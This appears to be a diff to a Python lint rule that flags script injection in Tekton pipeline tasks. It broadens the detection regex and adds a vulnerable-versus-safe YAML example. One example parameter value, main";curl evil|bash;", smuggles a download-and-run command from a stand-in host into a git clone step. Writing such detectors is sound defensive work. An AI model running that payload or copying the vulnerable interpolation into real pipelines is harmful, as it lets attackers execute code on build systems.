@@ -26,22 +26,65 @@ RULE = Rule(
     ),
     docs_note=(
         "Fires on any ``$(params.X)`` or ``$(workspaces.X.path)`` "
-        "token inside a ``script:`` body that isn't already wrapped "
-        "in double quotes (`\"$(params.X)\"`). Doesn't fire on the "
-        "env-var indirection pattern, which is safe."
+        "token inside a ``script:`` body. Tekton substitutes the value "
+        "into the script text before the shell parses it, so wrapping "
+        "the token in double quotes does NOT help: an attacker value "
+        "containing a ``\"`` closes the quote and the rest runs as "
+        "shell. Only the env-var indirection pattern (bind the param "
+        "via ``env:`` then reference the shell variable quoted, "
+        "``\"$NAME\"``) is safe, and the rule doesn't fire on that."
+    ),
+    exploit_example=(
+        "# Vulnerable: ``$(params.revision)`` is substituted into\n"
+        "# the script literally before the shell parses it. A\n"
+        "# PipelineRun whose ``revision`` param is\n"
+        "# ``main\";curl evil|bash;\"`` executes the injected curl\n"
+        "# in the step's shell context.\n"
+        "apiVersion: tekton.dev/v1\n"
+        "kind: Task\n"
+        "metadata: { name: clone }\n"
+        "spec:\n"
+        "  params:\n"
+        "    - name: revision\n"
+        "      type: string\n"
+        "  steps:\n"
+        "    - name: clone\n"
+        "      image: alpine/git@sha256:abc123...\n"
+        "      script: |\n"
+        "        git clone https://github.com/org/repo --branch $(params.revision)\n"
+        "\n"
+        "# Safe: bind the param to a shell variable via ``env`` and\n"
+        "# quote it on every use. Tekton expands ``$(params.*)`` at\n"
+        "# template time; shell quoting defends only at the shell\n"
+        "# layer, so the indirection through env is what matters.\n"
+        "apiVersion: tekton.dev/v1\n"
+        "kind: Task\n"
+        "metadata: { name: clone }\n"
+        "spec:\n"
+        "  params:\n"
+        "    - name: revision\n"
+        "      type: string\n"
+        "  steps:\n"
+        "    - name: clone\n"
+        "      image: alpine/git@sha256:abc123...\n"
+        "      env:\n"
+        "        - name: REVISION\n"
+        "          value: $(params.revision)\n"
+        "      script: |\n"
+        "        git clone https://github.com/org/repo --branch \"$REVISION\""
     ),
 )
 
-_UNSAFE_PARAM_RE = re.compile(
-    r"(?<!\")\$\(params\.[A-Za-z0-9_-]+\)"
-    r"|(?<!\")\$\(workspaces\.[A-Za-z0-9_-]+\.path\)"
-)
-# ``eval`` (and other shell-eval contexts) re-parses its argument as
-# shell, so even quoted ``"$(params.X)"`` is unsafe inside eval. Match
-# eval invocations regardless of quoting around the substitution.
-_EVAL_PARAM_RE = re.compile(
-    r"\beval\b[^\n]*?\$\(params\.[A-Za-z0-9_-]+\)"
-    r"|\beval\b[^\n]*?\$\(workspaces\.[A-Za-z0-9_-]+\.path\)"
+# Any ``$(params.X)`` / ``$(workspaces.X.path)`` token in a script body.
+# Tekton expands these into the script text BEFORE the shell parses it,
+# so quoting in the template (``"$(params.X)"``) does not protect against
+# an attacker value that contains a closing quote. Every direct
+# interpolation into a script is therefore unsafe; the safe pattern is
+# env-var indirection, which carries no ``$(params.X)`` token in the
+# script (it references a shell variable instead).
+_PARAM_RE = re.compile(
+    r"\$\(params\.[A-Za-z0-9_-]+\)"
+    r"|\$\(workspaces\.[A-Za-z0-9_-]+\.path\)"
 )
 
 
@@ -58,7 +101,7 @@ def check(ctx: TektonContext) -> Finding:
             continue
         examined += 1
         for sname, script in iter_step_scripts(doc):
-            m = _UNSAFE_PARAM_RE.search(script) or _EVAL_PARAM_RE.search(script)
+            m = _PARAM_RE.search(script)
             if m is not None:
                 offenders.append(
                     f"{doc.kind}/{doc.name} {sname}: {m.group(0)}"
